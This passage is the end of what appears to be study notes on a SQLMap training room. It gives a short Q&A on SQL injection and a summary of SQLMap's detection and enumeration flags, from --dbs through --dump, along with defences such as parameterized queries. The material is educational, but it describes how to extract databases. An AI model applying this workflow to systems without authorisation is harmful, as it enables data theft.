| **Q8. Difference between `--level` and `--risk`?** | `--level` controls how extensively SQLMap tests; `--risk` controls the riskiness of the payloads it uses. |
| **Q9. Why is DBMS fingerprinting important?** | Different DBMS products have different SQL syntax, functions, metadata and behaviours, so SQLMap adapts its techniques. |
| **Q10. Why is targeted extraction preferable to dumping everything?** | It minimises unnecessary traffic and sensitive-data exposure while still proving impact. |
| **Q11. Does SQLMap replace manual penetration testing?** | No — it automates SQLi testing, but understanding HTTP, application logic, SQL, databases, authentication and impact remains essential. |
| **Q12. What is the primary defence against SQL Injection?** | Parameterized/prepared statements, backed by least privilege, input validation, hidden DB errors and monitoring. |

## Final Takeaway

**SQLMap** is an automated tool for detecting and exploiting **SQL Injection**, the vulnerability that arises when a web application places user-controlled input into an **SQL** query without treating it as data — letting an attacker rewrite the query's logic with operators like `AND`, `OR`, always-true conditions such as `1=1`, quotes and comments. This room grounds that idea in the **web ↔ database** chain (`USER → WEB APP → SQL → DBMS → DATABASE`), covers the four techniques (**Boolean-based blind**, **Error-based**, **Time-based blind** and **UNION-based**), and then drives SQLMap through its full workflow: test a target with `-u`, fingerprint the **DBMS**, and walk the enumeration hierarchy `--dbs` → `-D` → `--tables` → `-T` → `--columns` → `-C` → `--dump`, tuning with `--level` and `--risk` and handling authenticated or POST requests with `-r`, `--cookie` and `-H`. The recurring lesson is that automation never replaces methodology — you must identify the right request and read the output — and the definitive defence is the **parameterized query**, which keeps user input as data and out of the query's logic.
